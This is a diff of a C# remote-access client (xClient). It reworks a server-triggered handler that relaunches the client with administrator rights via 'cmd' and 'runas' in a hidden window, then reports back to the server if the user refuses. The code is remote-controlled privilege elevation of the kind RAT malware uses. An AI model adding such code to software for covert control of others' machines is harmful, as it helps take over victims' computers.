@@ -7,6 +7,7 @@ using System.Net.NetworkInformation;
 using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Config;
+using xClient.Core.Data;
 using xClient.Core.Extensions;
 using xClient.Core.Helper;
 using xClient.Core.Networking;
@@ -439,32 +440,35 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
+        public static void HandleDoAskElevate(Packets.ServerPackets.DoAskElevate command, Client client)
         {
-            if (!(WindowsAccountHelper.GetAccountType() == "Admin"))
+            if (WindowsAccountHelper.GetAccountType() != "Admin")
             {
-                ProcessStartInfo proc = new ProcessStartInfo();
-                proc.UseShellExecute = true;
-                proc.WorkingDirectory = Environment.CurrentDirectory;
-                proc.FileName = Application.ExecutablePath;
-                proc.Verb = "runas";
-                MutexHelper.CloseMutex();  //Close the mutex so our new process will run
+                ProcessStartInfo processStartInfo = new ProcessStartInfo
+                {
+                    FileName = "cmd",
+                    Verb = "runas",
+                    Arguments = "/k START \"\" \"" + ClientData.CurrentPath + "\" & EXIT",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = true
+                };
 
+                MutexHelper.CloseMutex();  // close the mutex so our new process will run
                 try
                 {
-                    Process.Start(proc);
+                    Process.Start(processStartInfo);
                 }
                 catch
                 {
-                    new Packets.ClientPackets.SetStatus("User refused the elevation request").Execute(client);
-                    MutexHelper.CreateMutex(Settings.MUTEX);  //Re-grab the mutex
+                    new Packets.ClientPackets.SetStatus("User refused the elevation request.").Execute(client);
+                    MutexHelper.CreateMutex(Settings.MUTEX);  // re-grab the mutex
                     return;
                 }
                 Program.ConnectClient.Exit();
             }
             else
             {
-                new Packets.ClientPackets.SetStatus("Process already running as Admin").Execute(client);
+                new Packets.ClientPackets.SetStatus("Process already elevated.").Execute(client);
             }
         }
         
